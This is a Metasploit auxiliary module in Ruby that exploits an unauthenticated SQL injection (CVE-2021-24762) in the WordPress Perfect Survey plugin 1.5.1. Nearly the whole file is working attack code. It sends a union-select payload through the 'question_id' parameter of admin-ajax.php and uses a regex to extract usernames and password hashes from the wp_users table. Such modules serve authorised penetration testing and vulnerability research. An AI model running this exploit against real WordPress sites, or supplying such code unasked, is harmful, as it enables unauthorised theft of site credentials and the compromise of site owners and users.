##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Plugin Perfect Survey 1.5.1 SQLi (Unauthenticated)',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in the Perfect Survey
          plugin for WordPress (version 1.5.1). An unauthenticated attacker can
          exploit the SQLi to retrieve sensitive information such as usernames
          and password hashes from the `wp_users` table.
        },
        'Author' => [
          'Aaryan Golatkar', # Metasploit Module Creator
          'Ron Jost'         # Vulnerability discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['EDB', '50766'],
          ['CVE', '2021-24762']
        ],
        'DisclosureDate' => '2021-10-05',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to the WordPress installation', '/']),
      OptBool.new('SHOW_FULL_RESPONSE', [false, 'Show the entire JSON response if username and password hash are not extracted', false]),
      Opt::RPORT(80) # Default port for HTTP
    ])
  end

  def run
    print_status('Exploiting SQLi in Perfect Survey plugin...')

    # The vulnerable endpoint
    endpoint = normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php')

    # SQL injection payload
    sqli_payload = '1 union select 1,1,char(116,101,120,116),user_login,user_pass,0,0,null,null,null,null,null,null,null,null,null from wp_users'

    # HTTP GET request parameters
    params = {
      'action' => 'get_question',
      'question_id' => sqli_payload
    }

    # Send the request
    res = send_request_cgi({
      'uri' => endpoint,
      'method' => 'GET',
      'vars_get' => params
    })

    fail_with(Failure::Unreachable, 'Connection failed') unless res
    fail_with(Failure::Unknown, 'Unexpected reply from the server') unless res.code == 200

    print_status('Received a response from the server!')

    html_content = res.get_json_document['html']
    fail_with(Failure::Unknown, 'HTML content is empty') unless html_content

    # Use regex to extract username and the password hash
    match_data = /survey_question_p">([^<]+)[^$]+(\$P\$[^"]+)/.match(html_content)
    if match_data
      username, password_hash = match_data.captures
      print_good("Extracted credentials: #{username}:#{password_hash}")
    else
      print_warning('Could not extract username and password hash. Try enabling SHOW_FULL_RESPONSE.')
      print_status("Full Response (HTML):\n#{html_content}") if datastore['SHOW_FULL_RESPONSE']
    end
  rescue JSON::ParserError => e
    fail_with(Failure::UnexpectedReply, "Failed to parse response as JSON: #{e.message}")
  end
end
